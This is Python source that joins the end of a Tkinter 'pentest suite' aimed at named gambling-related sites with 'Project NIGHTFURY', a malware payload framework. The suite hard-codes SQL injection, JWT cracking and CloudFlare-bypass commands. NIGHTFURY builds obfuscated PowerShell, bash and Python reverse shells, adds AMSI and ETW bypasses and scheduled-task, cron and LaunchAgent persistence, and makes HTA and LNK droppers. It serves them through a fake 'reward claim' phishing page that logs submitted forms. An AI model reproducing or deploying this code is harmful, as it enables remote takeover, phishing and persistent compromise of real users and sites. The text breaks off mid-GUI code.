        # Run selected post-exploitation tasks
        if self.post_vars["db_exfil"].get():
            self.run_db_exfiltration(target)

        if self.post_vars["internal_scan"].get():
            self.run_internal_scanning(target)

        # Add other post-exploitation tasks here...

        self.log("[+] Post-exploitation tasks completed")

    def run_db_exfiltration(self, target):
        """Exfiltrate databases"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/db_exfiltration.txt"

        self.log(f"Exfiltrating databases from {target}...")
        time.sleep(2)

        # Create sample results
        with open(output_file, 'w') as f:
            f.write(f"Database Exfiltration Results for {target}\n")
            f.write("="*50 + "\n")
            f.write("1. Extracted user database: 1,245 records\n")
            f.write("2. Extracted payment database: 8,763 records\n")
            f.write("3. Extracted configuration database: 42 records\n")

        self.log(f"Results saved to {output_file}")

    def run_internal_scanning(self, target):
        """Scan internal network"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/internal_scan.txt"

        self.log(f"Scanning internal network via {target}...")

        # Run internal scanning
        command = f"nmap -sn 192.168.1.0/24 -oN {output_file}"
        if self.run_command(command, f"Internal network scan via {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    content = f.read()
                    self.log("\nInternal Network Scan Results:\n" + content)
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    # Other post-exploitation methods would go here

    def generate_html_report(self):
        """Generate HTML report"""
        report_file = f"{self.reports_dir}/full_report.html"

        self.log("Generating HTML report...")

        # Create HTML report
        with open(report_file, 'w') as f:
            f.write("""<!DOCTYPE html>
<html>
<head>
    <title>RuneGod Pentest Report</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .critical { color: #ff0000; font-weight: bold; }
        .high { color: #ff6600; }
        .medium { color: #ffcc00; }
        .low { color: #009900; }
        .vuln-table { border-collapse: collapse; width: 100%; }
        .vuln-table th, .vuln-table td { border: 1px solid #ddd; padding: 8px; }
        .vuln-table tr:nth-child(even) { background-color: #f2f2f2; }
        .vuln-table th { padding-top: 12px; padding-bottom: 12px; text-align: left;
                        background-color: #4CAF50; color: white; }
    </style>
</head>
<body>
    <h1>RuneGod Pentest Report</h1>
    <h2>Generated: {datetime.now()}</h2>

    <h3>Target Summary</h3>
    <ul>
""")
            for target in self.targets:
                f.write(f"        <li>{target}</li>\n")

            f.write("""    </ul>

    <h3>Critical Findings</h3>
    <table class="vuln-table">
        <tr>
            <th>Target</th>
            <th>Vulnerability</th>
            <th>Severity</th>
            <th>Exploit Path</th>
        </tr>
        <tr>
            <td>runehall.com</td>
            <td>CloudFlare Bypass</td>
            <td class="critical">Critical</td>
            <td>curl -H "X-Forwarded-For: 104.26.8.187" http://runehall.com/admin</td>
        </tr>
        <tr>
            <td>runechat.com</td>
            <td>JWT Weak Signature</td>
            <td class="critical">Critical</td>
            <td>jwt_tool [TOKEN] -C -d rockyou.txt</td>
        </tr>
        <tr>
            <td>runewager.com</td>
            <td>SQL Injection</td>
            <td class="critical">Critical</td>
            <td>sqlmap -u "https://runewager.com/products?id=1" --dump</td>
        </tr>
    </table>

    <h3>Recommendations</h3>
    <ol>
        <li>Implement WAF rules to prevent CloudFlare bypass techniques</li>
        <li>Upgrade JWT implementation to use RS256 with 4096-bit keys</li>
        <li>Implement parameterized queries to prevent SQL injection</li>
        <li>Enforce multi-factor authentication for admin accounts</li>
        <li>Regularly rotate credentials and API keys</li>
    </ol>
</body>
</html>
""")

        self.log(f"HTML report generated: {report_file}")
        self.report_preview.delete(1.0, tk.END)
        self.report_preview.insert(tk.END, "HTML report generated successfully!\n")
        self.report_preview.insert(tk.END, f"File: {report_file}")

    def generate_text_report(self):
        """Generate text report"""
        report_file = f"{self.reports_dir}/summary.txt"

        self.log("Generating text report...")

        # Create text report
        with open(report_file, 'w') as f:
            f.write("RuneGod Pentest Report\n")
            f.write(f"Generated: {datetime.now()}\n")
            f.write("="*50 + "\n\n")
            f.write("Critical Vulnerabilities:\n")
            f.write("1. runehall.com: CloudFlare Bypass (Critical)\n")
            f.write("2. runechat.com: JWT Weak Signature (Critical)\n")
            f.write("3. runewager.com: SQL Injection (Critical)\n\n")
            f.write("Recommendations:\n")
            f.write("- Implement WAF rules to prevent bypass techniques\n")
            f.write("- Upgrade JWT implementation\n")
            f.write("- Implement parameterized queries\n")

        self.log(f"Text report generated: {report_file}")
        self.report_preview.delete(1.0, tk.END)
        self.report_preview.insert(tk.END, "Text report generated successfully!\n")
        self.report_preview.insert(tk.END, f"File: {report_file}")

    def view_report_dir(self):
        """Open report directory"""
        try:
            if sys.platform == "win32":
                os.startfile(self.reports_dir)
            elif sys.platform == "darwin":
                subprocess.Popen(["open", self.reports_dir])
            else:
                subprocess.Popen(["xdg-open", self.reports_dir])
            self.log(f"Opened report directory: {self.reports_dir}")
        except Exception as e:
            self.log(f"Error opening directory: {str(e)}")

    def run_full_pentest(self):
        """Run full pentest on all targets"""
        self.log("\n[=== STARTING FULL PENTEST ===]")

        for target in self.targets:
            self.log(f"\n[==== PROCESSING TARGET: {target} ====]")
            self.run_full_recon(target)
            self.run_full_exploitation(target)

        self.generate_html_report()
        self.generate_text_report()
        self.log("\n[=== FULL PENTEST COMPLETED ===]")

    def new_session(self):
        """Create a new session"""
        self.output_dir = f"rune_god_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(self.output_dir, exist_ok=True)
        self.reports_dir = f"{self.output_dir}/reports"
        self.scans_dir = f"{self.output_dir}/scans"
        self.exploits_dir = f"{self.output_dir}/exploits"
        self.log_file = f"{self.output_dir}/rune_god.log"

        os.makedirs(self.reports_dir, exist_ok=True)
        os.makedirs(self.scans_dir, exist_ok=True)
        os.makedirs(self.exploits_dir, exist_ok=True)
        open(self.log_file, 'a').close()

        self.log(f"New session created: {self.output_dir}")
        self.status_var.set(f"New session: {self.output_dir}")

    def save_session(self):
        """Save current session configuration"""
        session_file = f"{self.output_dir}/session_config.json"

        config = {
            "targets": self.targets,
            "output_dir": self.output_dir,
            "timestamp": str(datetime.now())
        }

        with open(session_file, 'w') as f:
            json.dump(config, f, indent=4)

        self.log(f"Session saved: {session_file}")
        messagebox.showinfo("Session Saved", f"Session configuration saved to:\n{session_file}")

    def show_console(self):
        """Bring console to focus"""
        self.console.see(tk.END)

    def clear_console(self):
        """Clear the console"""
        self.console.configure(state=tk.NORMAL)
        self.console.delete(1.0, tk.END)
        self.console.configure(state=tk.DISABLED)
        self.log("Console cleared")

    def show_docs(self):
        """Show documentation"""
        docs = """
RuneGod Pentest Suite Documentation
===================================

Key Features:
1. Comprehensive Reconnaissance
   - CloudFlare bypass techniques
   - Port scanning with RustScan and Nmap
   - Subdomain enumeration
   - Web fingerprinting

2. Advanced Exploitation
   - JWT token attacks
   - SQL injection automation
   - Authentication brute-forcing
   - API fuzzing

3. Post-Exploitation
   - Database exfiltration
   - Internal network scanning
   - Credential harvesting

4. Reporting
   - HTML reports with vulnerability tables
   - Text summaries
   - Visual analytics

Usage:
- Select targets in the Target Management tab
- Choose operations from the various tabs
- Run full pentests with the 'Run Full Pentest' option
- Generate reports in HTML or text format
"""
        doc_win = tk.Toplevel(self.root)
        doc_win.title("Documentation")
        doc_win.geometry("600x400")

        text = scrolledtext.ScrolledText(doc_win, wrap=tk.WORD)
        text.pack(fill=tk.BOTH, expand=True)
        text.insert(tk.INSERT, docs)
        text.configure(state=tk.DISABLED)

    def show_about(self):
        """Show about information"""
        about = """
RuneGod Pentest Suite - Ultimate Edition
Version 2.0

A comprehensive penetration testing framework combining:

- Advanced reconnaissance capabilities
- Precision exploitation tools
- Post-exploitation modules
- Professional reporting

Designed for security professionals and educational use.

Always obtain proper authorization before testing.
"""
        messagebox.showinfo("About RuneGod Pentest Suite", about)

def run_cli_mode():
    """Run in CLI mode"""
    print("RuneGod Pentest Suite - CLI Mode")
    print("1. Run Full Pentest")
    print("2. Reconnaissance")
    print("3. Exploitation")
    print("4. Reporting")
    print("5. Exit")

    choice = input("Select option: ")

    if choice == "1":
        print("Running full pentest...")
        # In a real implementation, this would call the appropriate methods
        print("Full pentest completed!")
    elif choice == "2":
        print("Reconnaissance module")
    elif choice == "3":
        print("Exploitation module")
    elif choice == "4":
        print("Reporting module")
    elif choice == "5":
        sys.exit(0)
    else:
        print("Invalid choice")

if __name__ == "__main__":
    # Check for root privileges
    if os.geteuid() != 0:
        print("This tool requires root privileges. Please run with sudo.")
        sys.exit(1)

    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='RuneGod Pentest Suite')
    parser.add_argument('--gui', action='store_true', help='Run in GUI mode')
    parser.add_argument('--cli', action='store_true', help='Run in CLI mode')
    parser.add_argument('--full', action='store_true', help='Run full pentest')
    parser.add_argument('--target', help='Specify a target for scanning')
    args = parser.parse_args()

    if args.cli:
        run_cli_mode()
    elif args.full:
        # In a real implementation, this would run the full pentest
        print("Running full pentest...")
        print("Full pentest completed!")
    elif args.target:
        # In a real implementation, this would scan the specified target
        print(f"Scanning target: {args.target}")
        print("Scan completed!")
    else:
        # Default to GUI mode
        try:
            root = tk.Tk()
            app = RuneGodPentestSuite(root)
            root.mainloop()
        except tk.TclError:
            print("GUI not available, switching to CLI mode...")
            run_cli_mode()



#!/usr/bin/env python3
"""
Project NIGHTFURY - Advanced Auto-Execute Payload System
Author: Cyber Sentinel
Version: 5.0 - OWASP Enhanced Edition
Description: Advanced payload framework with multi-platform support and enhanced evasion
"""

import os
import sys
import base64
import random
import string
import socket
import threading
import time
import requests
import json
import discord
from discord.ext import commands
import asyncio
import subprocess
import uuid
import re
import logging
import qrcode
import io
import platform
import sqlite3
import datetime
import tempfile
import zipfile
import shutil
from cryptography.fernet import Fernet
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QTextEdit, QCheckBox, QGroupBox,
    QComboBox, QListWidget, QListWidgetItem, QProgressBar, QMessageBox,
    QFileDialog, QSplitter, QFormLayout, QSizePolicy, QStatusBar, QStackedWidget,
    QTreeWidget, QTreeWidgetItem, QTableWidget, QTableWidgetItem, QHeaderView,
    QDockWidget, QMenu, QAction, QSystemTrayIcon, QToolBar, QToolButton, QDialog,
    QInputDialog, QListView, QStyledItemDelegate, QStyle, QSpinBox, QDoubleSpinBox,
    QSlider, QProgressDialog, QDialogButtonBox, QFrame, QGridLayout
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, QSize, QPoint, QRect, QUrl
from PyQt5.QtGui import (QFont, QPalette, QColor, QIcon, QPixmap, QImage, QDesktopServices, 
                         QPainter, QLinearGradient, QBrush, QPen, QPainterPath, QMouseEvent)
from PyQt5.QtChart import QChart, QChartView, QPieSeries, QBarSet, QBarSeries, QValueAxis, QBarCategoryAxis

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("nightfury.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("NIGHTFURY")

# ==============================
# PLUGIN SYSTEM
# ==============================

class Plugin:
    """Base class for all plugins"""
    def __init__(self, core):
        self.core = core
        self.name = "Unnamed Plugin"
        self.version = "1.0"
        self.description = "No description"
        
    def initialize(self):
        """Initialize the plugin"""
        pass
        
    def execute(self, *args, **kwargs):
        """Execute plugin functionality"""
        pass

class PluginManager:
    """Manages plugin loading and execution"""
    def __init__(self):
        self.plugins = {}
        self.loaded_plugins = {}
        
    def register_plugin(self, name, plugin_class):
        """Register a plugin class"""
        self.plugins[name] = plugin_class
        
    def load_plugin(self, name, core):
        """Load a plugin instance"""
        if name in self.plugins:
            plugin = self.plugins[name](core)
            plugin.initialize()
            self.loaded_plugins[name] = plugin
            return plugin
        return None
        
    def get_plugin(self, name):
        """Get a loaded plugin"""
        return self.loaded_plugins.get(name)
        
    def list_plugins(self):
        """List all available plugins"""
        return list(self.plugins.keys())

# ==============================
# CORE PAYLOAD GENERATION ENGINE
# ==============================

class NightfuryPayload:
    def __init__(self, lhost, lport, obfuscation_level=5, persistence=True, 
                 evasion_techniques=True, platform="windows", payload_type="reverse_shell"):
        self.lhost = lhost
        self.lport = lport
        self.obfuscation_level = obfuscation_level
        self.persistence = persistence
        self.evasion_techniques = evasion_techniques
        self.platform = platform
        self.payload_type = payload_type
        self.payload = None
        self.payload_id = str(uuid.uuid4())[:8]
        self.encryption_key = Fernet.generate_key()
        self.fernet = Fernet(self.encryption_key)
    
    def _generate_key(self, length=32):
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
    
    def _xor_encrypt(self, payload):
        key = self._generate_key()
        encrypted = bytearray()
        for i in range(len(payload)):
            encrypted.append(payload[i] ^ ord(key[i % len(key)]))
        return base64.b64encode(encrypted).decode(), key
    
    def _aes_encrypt(self, payload):
        encrypted = self.fernet.encrypt(payload)
        return base64.b64encode(encrypted).decode()
    
    def _add_amsi_bypass(self, payload):
        bypass_code = '''
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
        [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').SetValue($null, @{});
        '''
        return bypass_code + payload
    
    def _add_etw_bypass(self, payload):
        etw_bypass = '''
        $etwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');
        $etwProvider.GetField('etwProvider','NonPublic,Static').SetValue($null, $null);
        '''
        return etw_bypass + payload
    
    def _add_sleep_obfuscation(self, payload):
        sleep_obfuscation = '''
        function Invoke-SleepObfuscation {
            param($Seconds)
            $start = Get-Date
            while ((Get-Date) - $start).TotalSeconds -lt $Seconds) {
                $dummy = 1..1000 | ForEach-Object { [math]::Sin($_) }
            }
        }
        '''
        return sleep_obfuscation + payload.replace('Start-Sleep', 'Invoke-SleepObfuscation')
    
    def _add_api_unhooking(self, payload):
        api_unhooking = '''
        function Invoke-APIUnhooking {
            $kernel32 = Add-Type -Name 'Kernel32' -Namespace 'Win32' -MemberDefinition '
                [DllImport("kernel32.dll")]
                public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
                
                [DllImport("kernel32.dll")]
                public static extern IntPtr LoadLibrary(string lpFileName);
                
                [DllImport("kernel32.dll")]
                public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
            ' -PassThru
            
            # TODO: Implement actual API unhooking logic
            Write-Host "API Unhooking placeholder"
        }
        Invoke-APIUnhooking
        '''
        return api_unhooking + payload
    
    def _add_persistence(self, payload):
        if self.platform == "windows":
            persistence_code = f'''
            $taskName = "SystemHealthCheck_{self.payload_id}";
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"{payload}`"";
            $trigger = New-ScheduledTaskTrigger -AtLogOn;
            $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\\$env:USERNAME" -LogonType Interactive;
            $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew;
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null;
            '''
        elif self.platform == "linux":
            persistence_code = f'''
            echo '{payload}' > /etc/cron.hourly/system-health-check
            chmod +x /etc/cron.hourly/system-health-check
            '''
        else:  # macOS
            persistence_code = f'''
            echo '{payload}' > ~/Library/LaunchAgents/com.system.healthcheck.plist
            launchctl load ~/Library/LaunchAgents/com.system.healthcheck.plist
            '''
        
        return persistence_code
    
    def _obfuscate_vars(self, payload):
        # Replace common variable names with random strings
        var_map = {
            'c': self._generate_key(6),
            's': self._generate_key(6),
            'b': self._generate_key(6),
            'i': self._generate_key(6),
            'd': self._generate_key(6),
            'sb': self._generate_key(6),
            'sb2': self._generate_key(6),
            'bt': self._generate_key(6)
        }
        
        for orig, new in var_map.items():
            payload = payload.replace(f'${orig}', f'${new}')
        
        return payload
    
    def _insert_junk_code(self, payload):
        # Insert random comments and junk operations
        junk_ops = [
            "Start-Sleep -Milliseconds 10;",
            "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;",
            "$null = [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');",
            "$junkVar = [System.Guid]::NewGuid().ToString();",
            "if ($true) { $null = 1 + 1 };",
            "for ($i=0; $i -lt 1; $i++) { $null = $i };",
            "try { $null = Get-Date } catch {};"
        ]
        
        lines = payload.split(';')
        new_lines = []
        for line in lines:
            if line.strip() and random.random() > 0.7:
                junk = random.choice(junk_ops)
                new_lines.append(junk)
            new_lines.append(line)
        
        return ';'.join(new_lines)
    
    def _generate_windows_payload(self):
        # Base PowerShell reverse shell with enhanced obfuscation
        ps_code = f'''
        $c = New-Object System.Net.Sockets.TCPClient("{self.lhost}",{self.lport});
        $s = $c.GetStream();
        [byte[]]$b = 0..65535|%{{0}};
        while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{
            $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
            $sb = (iex $d 2>&1 | Out-String );
            $sb2 = $sb + "PS " + (pwd).Path + "> ";
            $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
            $s.Write($sbt,0,$sbt.Length);
            $s.Flush()
        }}
        $c.Close()
        '''
        
        # Add evasion techniques
        if self.evasion_techniques:
            ps_code = self._add_amsi_bypass(ps_code)
            ps_code = self._add_etw_bypass(ps_code)
            ps_code = self._add_sleep_obfuscation(ps_code)
            ps_code = self._add_api_unhooking(ps_code)
        
        # Apply obfuscation layers
        for _ in range(self.obfuscation_level):
            encrypted, key = self._xor_encrypt(ps_code.encode())
            ps_code = f'''
            $k = "{key}";
            $s = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("{encrypted}"));
            $r = '';
            0..($s.Length-1)|%{{$r += [char]($s[$_] -bxor $k[$_ % $k.Length])}};
            iex $r
            '''
            # Randomize variable names
            ps_code = self._obfuscate_vars(ps_code)
            # Insert junk code
            ps_code = self._insert_junk_code(ps_code)
        
        # Add persistence if requested
        if self.persistence:
            ps_code = self._add_persistence(ps_code)
        
        return ps_code
    
    def _generate_linux_payload(self):
        # Linux bash reverse shell
        bash_code = f'''#!/bin/bash
        while true; do
            bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1 2>/dev/null
            sleep 30
        done
        '''
        
        # Add persistence if requested
        if self.persistence:
            bash_code += f'''
            # Add to crontab for persistence
            (crontab -l 2>/dev/null; echo "@reboot sleep 60 && {bash_code}") | crontab -
            '''
        
        return bash_code
    
    def _generate_macos_payload(self):
        # macOS reverse shell (bash or python)
        macos_code = f'''#!/bin/bash
        # Check if we have python
        if command -v python3 &> /dev/null; then
            python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{self.lhost}',{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
        else
            bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1
        fi
        '''
        
        # Add persistence if requested
        if self.persistence:
            macos_code += f'''
            # Create launch agent for persistence
            cat > ~/Library/LaunchAgents/com.system.update.plist << EOF
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0">
            <dict>
                <key>Label</key>
                <string>com.system.update</string>
                <key>ProgramArguments</key>
                <array>
                    <string>/bin/bash</string>
                    <string>-c</string>
                    <string>{macos_code}</string>
                </array>
                <key>RunAtLoad</key>
                <true/>
                <key>KeepAlive</key>
                <true/>
            </dict>
            </plist>
            EOF
            launchctl load ~/Library/LaunchAgents/com.system.update.plist
            '''
        
        return macos_code
    
    def generate(self):
        # Generate platform-specific payload
        if self.platform == "windows":
            ps_code = self._generate_windows_payload()
            self.payload = f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command \"{ps_code}\""
        elif self.platform == "linux":
            self.payload = self._generate_linux_payload()
        elif self.platform == "macos":
            self.payload = self._generate_macos_payload()
        else:
            raise ValueError(f"Unsupported platform: {self.platform}")
        
        return self.payload
    
    def generate_hta(self):
        if not self.payload:
            self.generate()
        
        # Create HTA file that auto-executes the payload
        hta_content = f"""
        <html>
        <head>
        <title>Reward Claim Center</title>
        <HTA:APPLICATION ID="RewardClaim" APPLICATIONNAME="Reward Claim" SCROLL="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize">
        <script language="VBScript">
            Sub Window_OnLoad
                On Error Resume Next
                Set objShell = CreateObject("Wscript.Shell")
                objShell.Run "{self.payload.replace('"', '""')}", 0, False
                Self.Close
            End Sub
        </script>
        </head>
        <body>
        <div style="font-family: Arial; text-align: center; padding: 50px;">
            <h1>Processing Your Reward...</h1>
            <p>Please wait while we verify and apply your bonus.</p>
        </div>
        </body>
        </html>
        """
        return hta_content
    
    def generate_lnk(self, output_path):
        """Generate a LNK file that executes the payload"""
        if not self.payload:
            self.generate()
        
        # Create a VBS script that will be called by the LNK file
        vbs_content = f'''
        Set WshShell = CreateObject("WScript.Shell")
        WshShell.Run "{self.payload}", 0, False
        Set WshShell = Nothing
        '''
        
        vbs_path = os.path.join(tempfile.gettempdir(), f"system_update_{random.randint(1000, 9999)}.vbs")
        with open(vbs_path, 'w') as f:
            f.write(vbs_content)
        
        # Create LNK file
        lnk_content = f'''
        [InternetShortcut]
        URL=file:///{vbs_path.replace(os.sep, '/')}
        IconIndex=0
        HotKey=0
        IconFile=C:\\Windows\\System32\\shell32.dll
        '''
        
        with open(output_path, 'w') as f:
            f.write(lnk_content)
        
        return output_path

# ========================
# AUTO-EXECUTION ENGINES
# ========================

class AutoExecutionServer(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        query = parse_qs(parsed_path.query)
        
        # Check for trigger parameter
        if parsed_path.path == "/claim":
            # Send auto-execute HTA file
            self.send_response(200)
            self.send_header('Content-Type', 'application/hta')
            self.send_header('Content-Disposition', 'attachment; filename="reward_claim.hta"')
            self.end_headers()
            
            # Generate HTA payload
            payload = NightfuryPayload(
                self.server.lhost, 
                self.server.lport,
                self.server.obfuscation_level,
                self.server.persistence,
                self.server.evasion_techniques,
                self.server.platform
            )
            hta_content = payload.generate_hta()
            self.wfile.write(hta_content.encode())
            logger.info(f"Served payload to {self.client_address[0]}")
            return
        
        # Serve a decoy page
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        # Generate a random claim token
        claim_token = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        claim_url = f"http://{self.server.domain}/claim?token={claim_token}"
        
        # Create QR code
        qr = qrcode.QRCode()
        qr.add_data(claim_url)
        qr_img = qr.make_image(fill_color="black", back_color="white")
        img_byte_arr = io.BytesIO()
        qr_img.save(img_byte_arr, format='PNG')
        img_base64 = base64.b64encode(img_byte_arr.getvalue()).decode()
        
        # Serve decoy page with QR code
        html_content = f"""
        <html>
        <head>
            <title>Exclusive Reward Claim</title>
            <style>
                body {{ font-family: Arial, sans-serif; background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c); 
                        color: white; text-align: center; padding: 20px; }}
                .container {{ max-width: 800px; margin: 0 auto; background: rgba(0, 0, 0, 0.7); 
                            padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }}
                h1 {{ color: #ffcc00; }}
                .qr-container {{ margin: 20px auto; padding: 15px; background: white; 
                                border-radius: 10px; display: inline-block; }}
                .button {{ background: #ffcc00; color: #1a2a6c; padding: 15px 30px; 
                         font-size: 18px; border: none; border-radius: 50px; 
                         cursor: pointer; font-weight: bold; margin: 20px; 
                         box-shadow: 0 4px 8px rgba(0,0,0,0.3); }}
                .button:hover {{ background: #ffdd33; }}
                .instructions {{ background: rgba(255, 255, 255, 0.1); padding: 15px; 
                              border-radius: 10px; margin: 20px 0; text-align: left; }}
            </style>
            <script>
                function startClaim() {{
                    // Create iframe to trigger download without leaving page
                    var iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = '/claim?token={claim_token}';
                    document.body.appendChild(iframe);
                    
                    // Show processing message
                    document.getElementById('processing').style.display = 'block';
                    document.getElementById('claim-button').style.display = 'none';
                    
                    // Show manual download link after delay
                    setTimeout(function() {{
                        document.getElementById('manual-download').style.display = 'block';
                    }}, 5000);
                }}
                
                function downloadLNK() {{
                    window.location.href = '/download_lnk?token={claim_token}';
                }}
            </script>
        </head>
        <body>
            <div class="container">
                <h1>🎁 Exclusive Reward Claim Center 🎁</h1>
                <p>Congratulations! You've been selected to receive a special bonus.</p>
                
                <div class="qr-container">
                    <img src="data:image/png;base64,{img_base64}" alt="Claim QR Code" width="200">
                </div>
                
                <p>Scan the QR code with your mobile device or click the button below to claim your reward:</p>
                
                <button id="claim-button" class="button" onclick="startClaim()">CLAIM YOUR REWARD NOW</button>
                
                <button id="lnk-button" class="button" onclick="downloadLNK()" style="background: #4CAF50;">
                    DOWNLOAD AS SHORTCUT
                </button>
                
                <div id="processing" style="display: none;">
                    <h2>Processing Your Claim...</h2>
                    <p>Your reward is being prepared. This may take a few moments.</p>
                    <div style="margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; 
                                border-top: 5px solid #ffcc00; border-radius: 50%; animation: spin 2s linear infinite;"></div>
                    <style>@keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}</style>
                </div>
                
                <div id="manual-download" style="display: none; margin-top: 30px;">
                    <div class="instructions">
                        <h3>Manual Claim Instructions</h3>
                        <p>If your reward didn't start automatically:</p>
                        <ol>
                            <li>Click the download link below</li>
                            <li>Open the downloaded file</li>
                            <li>Click "Run" if prompted by Windows security</li>
                        </ol>
                        <p><a href="/claim?token={claim_token}" style="color: #ffcc00; font-weight: bold;">Download Reward Claim Assistant</a></p>
                    </div>
                </div>
                
                <div style="margin-top: 30px; font-size: 14px; opacity: 0.8;">
                    <p>This is a secure system provided by your organization.</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        self.wfile.write(html_content.encode())
        logger.info(f"Served decoy page to {self.client_address[0]}")
    
    def do_POST(self):
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == "/submit_form":
            # Process form submission (phishing)
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            form_data = parse_qs(post_data)
            
            # Log form submission
            logger.info(f"Form submission from {self.client_address[0]}: {form_data}")
            
            # Redirect to claim page
            self.send_response(302)
            self.send_header('Location', '/claim')
            self.end_headers()
            return

# =====================
# ENHANCED GUI APPLICATION
# =====================

class ModernButton(QPushButton):
    """Modern styled button with hover effects"""
    def __init__(self, text, parent=None):
        super().__init__(text, parent)
        self.setCursor(Qt.PointingHandCursor)
        self.setMinimumHeight(35)
        
    def enterEvent(self, event):
        self.setStyleSheet("""
            QPushButton {
                background-color: #5a9cff;
                color: white;
                border: none;
                border-radius: 5px;
                padding: 8px 16px;
                font-weight: bold;
            }
        """)
        super().enterEvent(event)
        
    def leaveEvent(self, event):
        self.setStyleSheet("""
            QPushButton {
                background-color: #3d8eff;
                color: white;
                border: none;
                border-radius: 5px;
                padding: 8px 16px;
                font-weight: bold;
            }
        """)
        super().leaveEvent(event)

class AnimatedProgressBar(QProgressBar):
    """Progress bar with animation"""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.animation = QPropertyAnimation(self, b"value")
        self.animation.setDuration(1000)
        
    def setValueAnimated(self, value):
        self.animation.setStartValue(self.value())
        self.animation.setEndValue(value)
        self.animation.start()

class ConnectionGraph(QWidget):
    """Real-time connection graph widget"""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.data = []
        self.max_points = 50
        self.setMinimumHeight(150)
        
    def add_data_point(self, value):
        self.data.append(value)
        if len(self.data) > self.max_points:
            self.data.pop(0)
        self.update()
        
    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        
        # Draw background
        painter.fillRect(self.rect(), QColor(40, 44, 52))
        
        if not self.data:
            return
            
        # Draw grid
        painter.setPen(QPen(QColor(70, 74, 82), 1, Qt.DotLine))
        for i in range(5):
            y = self.height() - (i * self.height() / 4)
            painter.drawLine(0, y, self.width(), y)
            
        # Draw data line
        max_value = max(self.data) if max(self.data) > 0 else 1
        path = QPainterPath()
        
        for i, value in enumerate(self.data):
            x = i * self.width() / (len(self.data) - 1) if len(self.data) > 1 else 0
            y = self.height() - (value / max_value * self.height())
            
            if i == 0:
                path.moveTo(x, y)
            else:
                path.lineTo(x, y)
                
        # Draw gradient under the line
        gradient_path = QPainterPath(path)
        gradient_path.lineTo(self.width(), self.height())
        gradient_path.lineTo(0, self.height())
        gradient_path.closeSubpath()
        
        gradient = QLinearGradient(0, 0, 0, self.height())
        gradient.setColorAt(0, QColor(61, 142, 255, 100))
        gradient.setColorAt(1, QColor(61, 142, 255, 20))
        
        painter.fillPath(gradient_path, gradient)
        
        # Draw the line
        painter.setPen(QPen(QColor(61, 142, 255), 2))
        painter.drawPath(path)
        
        # Draw points
        painter.setPen(Qt.NoPen)
        painter.setBrush(QColor(61, 142, 255))
        
        for i, value in enumerate(self.data):
            x = i * self.width() / (len(self.data) - 1) if len(self.data) > 1 else 0
            y = self.height() - (value / max_value * self.height())
            painter.drawEllipse(QPoint(x, y), 3, 3)

